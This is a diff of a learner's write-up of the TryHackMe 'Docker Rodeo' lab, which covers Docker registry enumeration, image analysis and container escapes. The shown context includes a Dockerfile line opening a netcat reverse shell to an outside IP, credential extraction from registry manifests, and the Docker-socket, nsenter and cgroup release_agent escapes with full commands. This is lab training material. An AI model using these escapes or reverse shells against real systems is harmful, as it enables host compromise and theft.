@@ -49,7 +49,6 @@ MACHINE_IP    docker-rodeo.thm
 1.4.3. sudo systemctl start docker
 ```
 
-
 You are now ready to progress with the room.
 
 ```
@@ -122,7 +121,6 @@ These files contain commands such as RUN and COPY that will be executed by the c
 
 ![](https://assets.tryhackme.com/additional/docker-rodeo/t2/docker-image.png)
 
-
 Does Docker run on a Hypervisor? (Yay/Nay)
 Look back at the the diagrams explaining the OS abstraction levels!
 *Nay*
@@ -155,7 +153,6 @@ Platform: x86_64-pc-linux-gnu
 Compiled with: liblua-5.3.6 openssl-3.0.5 libssh2-1.10.0 libz-1.2.11 libpcre-8.39 nmap-libpcap-1.7.3 nmap-libdnet-1.12 ipv6
 Compiled without:
 Available nsock engines: epoll poll select
-
 
 ──(kali㉿kali)-[~]
 └─$ sudo apt install nmap 
@@ -211,7 +208,6 @@ Platform: x86_64-pc-linux-gnu
 Compiled with: liblua-5.3.6 openssl-3.0.5 libssh2-1.10.0 libz-1.2.11 libpcre-8.39 nmap-libpcap-1.7.3 nmap-libdnet-1.12 ipv6
 Compiled without:
 Available nsock engines: epoll poll select
-
 
 Yep! Rustscan works again for me 😊
 
@@ -382,8 +378,6 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 58.96 seconds
 
-
-
 ```
 
 ![](https://assets.tryhackme.com/additional/docker-rodeo/t3/rustscan.png)
@@ -397,7 +391,6 @@ docker pull rustscan/rustscan:1.8.0
 
  docker pull rustscan/rustscan:latest 
 
-
 ┌──(kali㉿kali)-[~]
 └─$ sudo docker pull rustscan/rustscan:latest 
 [sudo] password for kali: 
@@ -408,7 +401,6 @@ b393a686621b: Pull complete
 Digest: sha256:8ec1f92163e51259b9da5d7ebddb7973074cf7a014447547417e5ff278e24bec
 Status: Downloaded newer image for rustscan/rustscan:latest
 docker.io/rustscan/rustscan:latest
-
 
 I've learnt about Docker registries
 
@@ -435,7 +427,6 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 52.14 seconds
                                                                  
 
-
 ```
 
 ![](https://i.imgur.com/rz4orgs.png)
@@ -447,7 +438,6 @@ JavaScript Object Notation is an open standard file and data interchange format 
 The Docker Registry is a JSON endpoint, so we cannot just simply interact with it like we would a normal website - we will have to query it. Whilst this can be done via the terminal or browser, dedicated tools such as [Postman](https://www.postman.com/downloads/) or [Insomnia](https://insomnia.rest/download) are much better suited for the job. I will be using Postman in this room.
 
 To understand what routes are available to us, we need to read the [Docker Registry Documentation](https://docs.docker.com/registry/spec/api/). Please take the time to read this at your leisure.
-
 
 3.2.1. Discovering Repositories 
 We need to send a GET request to http://docker-rodeo.thm:5000/v2/_catalog to list all the repositories registered on the registry.
@@ -505,8 +495,6 @@ GET         http://docker-rodeo.thm:5000/v2/_catalog
 
 ![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/catalog1.png)
 
-![[Pasted image 20221025110526.png]]
-
 In this example, we're given a response of three repositories. For now, we are only going to focus on "cmnatic/myapp1".
 
 Before we can begin analysing a repository, we need two key pieces of information: 
@@ -531,15 +519,9 @@ GET          http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list
     ]
 }
 
-
-
-
 ```
 
 ![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/listingtags.png)
-
-![[Pasted image 20221025110840.png]]
-
 
 Note here we have three tags? That "notsecure" tag sure sounds interesting. We now have both pieces of information to retrieve the manifest files of the image for analysis.
 
@@ -594,18 +576,14 @@ GET ttp://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure
    ]
 }
 
-
 ```
 
 	Note the response - specifically the "history" key;  albeit slightly hard to read, we have a command that was executed during the image building stage stored in plaintext (echo \\\"here's a flag\\\" \\u003e /root/root.txt\"]` ). In this image, it's a string insert into /root/root.txt on the container. Although imagine if this was a password!
 
 ![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/manifest1.png)
 
-![[Pasted image 20221025111332.png]]
-
 3.2.3. Now it's Your Turn...
 Apply what we have done above, enumerate the 2nd Docker registry running on the Instance, find out what repositories are stored within it and ultimately extract some credentials for a database.
-
 
 ```
 Getting repositories
@@ -700,8 +678,6 @@ GET  http://docker-rodeo.thm:7000/v2/securesolutions/webserver/manifests/product
 
 ```
 
-![[Pasted image 20221025112153.png]]
-
 What is the port number of the 2nd Docker registry?
 *7000*
 
@@ -733,14 +709,11 @@ We'll start off with an example. Let's download a Docker image from our vulnerab
 
 4.2. Download the Docker image we are going to decompile using docker pull docker-rodeo.thm:5000/dive/example
 
-
 Note: If you receive this warning:
 Error response from daemon: Get https://docker-rodeo.thm:5000/v2/: http: server gave HTTP response to HTTPS client
 you need to revisit Step 1 in the first task of this room and then restart your Computer to ensure Docker has properly restarted.
 
 ![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/pullerror.png)
-
-
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -809,7 +782,6 @@ Fetching image... (this can take a while for large images)
 Analyzing image...
 Building cache...
 
-
 ```
 
 4.5. Using Dive
@@ -831,15 +803,11 @@ Looking at the "Layers" window in the top-left, we can see a total of 7 individu
 
 ![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive3.png)
 
-![[Pasted image 20221025120012.png]]
-
 Note how we can see the commands executed by the container when the image is being built in the "Layers" panel.
 
 For example, take a look at the first layer then press the "Tab" key to switch windows and scroll down (using the arrow keys) to the "home" directory in "Current Layer Contents" and then press the "Tab" key again to switch back to the "Layers" window.
 
 ![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive4.png)
-
-![[Pasted image 20221025120517.png]]
 
 At the 1st layer, there is nothing located in "/home" (highlighted in green in the above screenshot) on the container. However, if we were to proceed to the 2nd layer, the command mkdir -p /home/user is executed, and now we can see the directory "/home/user" (highlighted in red) has now been made on the container.
 
@@ -889,21 +857,12 @@ Fetching image... (this can take a while for large images)
 Analyzing image...
 Building cache...
 
-
-
-
-
 ```
  What is the "IMAGE_ID" for the "challenge" Docker image that you just downloaded? 
  *2a0a63ea5d88*
 
-![[Pasted image 20221025121022.png]]
 Using Dive, how many "Layers" are there in this image?
 *7*
-![[Pasted image 20221025121241.png]]
-
-![[Pasted image 20221025121211.png]]
-
 
 What user is successfully added?
 What command would you use to output a message on the command prompt?
@@ -940,7 +899,6 @@ RUN apt-get update -y
 RUN apt-get install netcat -y
 
 RUN nc -e /bin/sh 10.13.0.182 1337
-
 
 ┌──(kali㉿kali)-[~/docker_rodeo]
 └─$ sudo docker build .                                 
@@ -1023,7 +981,6 @@ Step 4/4 : RUN nc -e /bin/sh 10.13.0.182 1337
 REPOSITORY                             TAG           IMAGE ID       CREATED         SIZE
 <none>                                 <none>        23337f1e3b6f   4 minutes ago   92.6MB
 
-
 to remove a docker image, first remove the container and stop docker service
 
 https://www.digitalocean.com/community/tutorials/how-to-remove-docker-images-containers-and-volumes
@@ -1033,7 +990,6 @@ Stopping Service
 └─$ sudo systemctl stop docker  
 Warning: Stopping docker.service, but it can still be activated by:
   docker.socket
-
 
 Getting docker containers
 
@@ -1071,7 +1027,6 @@ Removing imagen that I've just created
 
 ┌──(kali㉿kali)-[~/docker_rodeo]
 └─$ sudo docker rmi 23337f1e3b6f    
-
 
 Deleted: sha256:23337f1e3b6f6520723ec946a8a5e8142636b5278913cf5d9e9912b3702d4d23
 Deleted: sha256:4f6a71a17af6638193e9423a072e1307a70a4b0e35bdbd5728c6daa4a4dfac2f
@@ -1354,7 +1309,6 @@ CONTAINER ID   IMAGE                  COMMAND                  CREATED         S
 fd1d7cc1b972   registry:2             "/entrypoint.sh /etc…"   2 years ago     Up 10 minutes   0.0.0.0:5000->5000/tcp   registry_example-registry_1
 c5bd077f9ddb   registry:2             "/entrypoint.sh /etc…"   2 years ago     Up 10 minutes   0.0.0.0:7000->5000/tcp   registry_actual-registry-1_1
 
-
 ```
 
 6.4.4. Experiment
@@ -1390,8 +1344,6 @@ b154d1c7b280
 └─$ sudo docker ps -a            
 CONTAINER ID   IMAGE                    COMMAND                  CREATED        STATUS                      PORTS     NAMES
 b154d1c7b280   blockchain-demo:latest   "docker-entrypoint.s…"   2 months ago   Exited (137) 2 months ago             blockchain-demo-master_blockchain-demo_1
-
-
 
 ┌──(kali㉿kali)-[~/docker_rodeo]
 └─$ sudo docker ps   
@@ -1658,7 +1610,6 @@ Username: danny
 
 Password: danny
 
-
 7.2. Looking for the exposed Docker socket
 Armed with the knowledge we've learnt about the Docker socket in "Vulnerability #4: RCE via Exposed Docker Daemon", we can look for exposure of this file within the container, and confirm whether or not the current user has permissions to run docker commands with groups.
 
@@ -1728,7 +1679,6 @@ drwx------  2 root root 4.0K Nov 12  2020 .ssh
 |1|/EHt5UUsnI9hqwcLMFA5TdvNtrs=|qihaDMUpcVI9fwvdha7PesRjel4= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZqllWCjU44z6Ho/Klb55xcniFu7VomYL0mtptJjIIJMH+XeCJ7USG+BWA/OM6qfSkOpmHRqQyWmq5tukju+2s=
 
 :)
-
 
 Escape Successful
 ```
@@ -1890,7 +1840,6 @@ root      2666  0.0  0.0      0     0 ?        I    01:30   0:00 [kworker/u4:1]
 root      2667  0.0  0.1  36700  3136 ?        R+   01:33   0:00 ps aux
 
 # exit
-
 
 danny@3d8fe1db6635:/var/run$ ps aux
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
@@ -2060,12 +2009,9 @@ root      2721  0.0  0.3  72360  6476 ?        Ss   01:41   0:00 sshd: root@pts/
 root      2725  0.0  0.1  20256  3776 pts/0    Ss   01:41   0:00 -bash
 root      2736  0.0  0.1  36152  3248 pts/0    R+   01:41   0:00 ps aux
 
-
-
 ```
 
 Use the following exploit: nsenter --target 1 --mount sh which does the following:
-
 
 1. We use the --target switch with the value of "1" to execute our shell command that we later provide to execute in the namespace of the special system process ID, to get ultimate root!
 
@@ -2203,7 +2149,6 @@ root      2741  0.0  0.3  72360  6452 ?        Ss   01:50   0:00 sshd: danny [pr
 danny     2743  0.0  0.1  72360  3420 ?        R    01:50   0:00 sshd: danny@pts/0
 danny     2744  0.0  0.1  20256  3876 pts/0    Ss   01:50   0:00 -bash
 danny     2752  0.0  0.1  36152  3180 pts/0    R+   01:51   0:00 ps aux
-
 
 nope I was wrong 🤣
 
@@ -2370,7 +2315,6 @@ root@63b932f4d7d2:/# hostnamectl
 
 ```
 
-
 Attempt the exploit, you will know you are successful if you can ls /home/cmnatic
 *Completed*
 
@@ -2398,8 +2342,6 @@ Well, if a container is running with privileged access to the operating system, 
 We can use a system package such as "libcap2-bin"'s capsh to list the capabilities our container has: capsh --print . I've highlighted a few interesting privileges that we have been given, but greatly encourage you to research into anymore that may be exploited! Privileges like these indicate that our container is running in privileged mode.
 
 ![999](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/listcap2.png)
-
-
 
 ```
 root@63b932f4d7d2:/# capsh --print
@@ -2445,7 +2387,6 @@ root@10.10.57.156's password:
 root@8a9427527c82:~# capsh --print | grep sys_admin
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
 Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
-
 
 ```
 
@@ -2520,7 +2461,6 @@ boot  etc  flag.txt  lib   media  opt  root  sbin  sys  usr
 root@8a9427527c82:/# cat flag.txt 
 thm{you_escaped_the_chains}
 
-
 root@8a9427527c82:/# cat exploit 
 #!/bin/sh
 cat /home/cmnatic/flag.txt > /var/lib/docker/overlay2/9b9172eea0e59d69f685b59ca0ef99c450876d5fe637b989c4c2d3502a49c769/diff/flag.txt
@@ -2546,7 +2486,6 @@ bin   dev  exploit   home  lib64  mnt  proc  run   srv  tmp  var
 boot  etc  flag.txt  lib   media  opt  root  sbin  sys  usr
 danny@8a9427527c82:/$ cat flag.txt 
 thm{you_escaped_the_chains}
-
 
 loading a new machine
 
@@ -2582,7 +2521,6 @@ danny
 
 this time cannot use the previous method because the PID 1 is a different ommand from /sbin/init
 
-
 so doing again :)
 
 root@8a9427527c82:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
@@ -2603,17 +2541,13 @@ root@8a9427527c82:/# hostnamectl
 root@8a9427527c82:/# nsenter --target 1 --mount sh# hostnamectl
 sh: 1: hostnamectl: not found
 
-
 ```
-
 
 Contents of "flag.txt" from the host operating system
 
 *thm{you_escaped_the_chains}*
 
-
 ### 10. Securing Your Container 
-
 
 Let's reflect back on the vulnerabilities that we have exploited. Not only have we learnt about the technology that is containerization, but also how these containers are a mere abstraction of the host's operating system.
 
@@ -2715,7 +2649,6 @@ root@8a9427527c82:/proc/1# cat cgroup
 1:name=systemd:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
 0::/system.slice/containerd.service
 
-
 yep in virtual machines execute more process than a container
 
 root@8a9427527c82:/proc/1# cd root
@@ -2778,15 +2711,11 @@ Mems_allowed_list:      0
 voluntary_ctxt_switches:        195
 nonvoluntary_ctxt_switches:     16
 
-
 Confirming suspicions...
-
 
 ```
 
 ### 12. Additional Material 
-
-
 
 12.1. Conclusion
 
@@ -2806,10 +2735,7 @@ Trailofbits' capabilities demonstration https://blog.trailofbits.com/2019/07/19/
 
 Cgroups101 https://docs.google.com/presentation/d/1WdByuxWgayPb-RstO-XaENSqVPGP7h6t3GS6W4jk4tk/htmlpresent
 
-
-
 Finished! 
 For today!
-
 
 [[Hardening Basics Part 2]]]
